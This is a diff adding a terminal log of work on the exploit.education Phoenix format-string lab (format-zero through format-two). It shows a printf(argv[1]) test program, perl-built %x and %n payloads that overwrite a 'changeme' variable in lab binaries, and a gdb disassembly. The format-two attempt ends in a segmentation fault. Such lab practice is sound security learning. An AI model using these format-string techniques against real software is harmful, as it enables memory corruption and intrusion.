@@ -1,0 +1,92 @@
+
+https://exploit.education/phoenix/format-zero/
+
+user@phoenix:~$ cat printf_experiment.c 
+#include <stdio.h>
+int main(int argc, char **argv) {
+	printf(argv[1]);
+	printf("\n");
+	return 0;
+}
+user@phoenix:~$ gcc printf_experiment.c -o printf
+user@phoenix:~$ ./printf %x
+3148c188
+
+user@phoenix:/opt/phoenix/amd64$ echo "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x" | ./format-zero 
+Welcome to phoenix/format-zero, brought to you by https://exploit.education
+Well done, the 'changeme' variable has been changed!
+
+
+user@phoenix:/opt/phoenix/amd64$ perl -e 'print "%16x"x2 . "\x12\x34\x56\x78"' | ./format-one 
+Welcome to phoenix/format-one, brought to you by https://exploit.education
+Uh oh, 'changeme' is not the magic value, it is 0x78563412
+user@phoenix:/opt/phoenix/amd64$ perl -e 'print "%16x"x2 . "\x6c\x4f\x76\x45"' | ./format-one 
+Welcome to phoenix/format-one, brought to you by https://exploit.education
+Well done, the 'changeme' variable has been changed correctly!
+user@phoenix:/opt/phoenix/amd64$ perl -e 'print "%32x" . "\x6c\x4f\x76\x45"' | ./format-one 
+Welcome to phoenix/format-one, brought to you by https://exploit.education
+Well done, the 'changeme' variable has been changed correctly!
+
+
+user@phoenix:/opt/phoenix/amd64$ gdb -q ./format-two 
+Reading symbols from ./format-two...
+(No debugging symbols found in ./format-two)
+(gdb) disass
+No frame selected.
+(gdb) disass main
+Dump of assembler code for function main:
+   0x000000000040068d <+0>:	push   %rbp
+   0x000000000040068e <+1>:	mov    %rsp,%rbp
+   0x0000000000400691 <+4>:	sub    $0x110,%rsp
+   0x0000000000400698 <+11>:	mov    %edi,-0x104(%rbp)
+   0x000000000040069e <+17>:	mov    %rsi,-0x110(%rbp)
+   0x00000000004006a5 <+24>:	mov    $0x400780,%edi
+   0x00000000004006aa <+29>:	callq  0x4004b0 <puts@plt>
+   0x00000000004006af <+34>:	cmpl   $0x1,-0x104(%rbp)
+   0x00000000004006b6 <+41>:	jle    0x400705 <main+120>
+   0x00000000004006b8 <+43>:	lea    -0x100(%rbp),%rax
+   0x00000000004006bf <+50>:	mov    $0x100,%edx
+   0x00000000004006c4 <+55>:	mov    $0x0,%esi
+   0x00000000004006c9 <+60>:	mov    %rax,%rdi
+   0x00000000004006cc <+63>:	callq  0x4004d0 <memset@plt>
+   0x00000000004006d1 <+68>:	mov    -0x110(%rbp),%rax
+   0x00000000004006d8 <+75>:	add    $0x8,%rax
+   0x00000000004006dc <+79>:	mov    (%rax),%rcx
+   0x00000000004006df <+82>:	lea    -0x100(%rbp),%rax
+   0x00000000004006e6 <+89>:	mov    $0x100,%edx
+   0x00000000004006eb <+94>:	mov    %rcx,%rsi
+   0x00000000004006ee <+97>:	mov    %rax,%rdi
+   0x00000000004006f1 <+100>:	callq  0x4004c0 <strncpy@plt>
+   0x00000000004006f6 <+105>:	lea    -0x100(%rbp),%rax
+   0x00000000004006fd <+112>:	mov    %rax,%rdi
+   0x0000000000400700 <+115>:	callq  0x40066d <bounce>
+   0x0000000000400705 <+120>:	mov    0x2003e5(%rip),%eax        # 0x600af0 <changeme>
+   0x000000000040070b <+126>:	test   %eax,%eax
+   0x000000000040070d <+128>:	je     0x40071b <main+142>
+   0x000000000040070f <+130>:	mov    $0x4007d0,%edi
+   0x0000000000400714 <+135>:	callq  0x4004b0 <puts@plt>
+   0x0000000000400719 <+140>:	jmp    0x400725 <main+152>
+   0x000000000040071b <+142>:	mov    $0x40080f,%edi
+   0x0000000000400720 <+147>:	callq  0x4004b0 <puts@plt>
+   0x0000000000400725 <+152>:	mov    $0x0,%edi
+   0x000000000040072a <+157>:	callq  0x4004e0 <exit@plt>
+End of assembler dump.
+
+user@phoenix:/opt/phoenix/amd64$ objdump -D ./format-two 
+...
+0000000000600af0 <changeme>:
+...
+
+user@phoenix:/opt/phoenix/amd64$ ./format-two $(perl -e 'print "AAAA" . "%8x"x32')
+Welcome to phoenix/format-two, brought to you by https://exploit.education
+AAAA       0       c       078324c0478324b5f78324ba078324ba078324ca0  40070578324cf8  40036841414141382578382578382578382578382578382578382578382578382578382578382578382578382578382578382578382578       0       0       0       0       0       0       0       0Better luck next time!
+user@phoenix:/opt/phoenix/amd64$ ./format-two $(perl -e 'print "AAAA" . "%8x"x12')
+Welcome to phoenix/format-two, brought to you by https://exploit.education
+AAAA       0       8       09c4b53789c4b530f9c4b53509c4b53509c4b5450  4007059c4b54a8  40036841414141Better luck next time!
+
+user@phoenix:/opt/phoenix/amd64$ ./format-two $(perl -e 'print "AAAA" . "%8x"x12 . "%n"')
+Welcome to phoenix/format-two, brought to you by https://exploit.education
+Segmentation fault
+
+
+
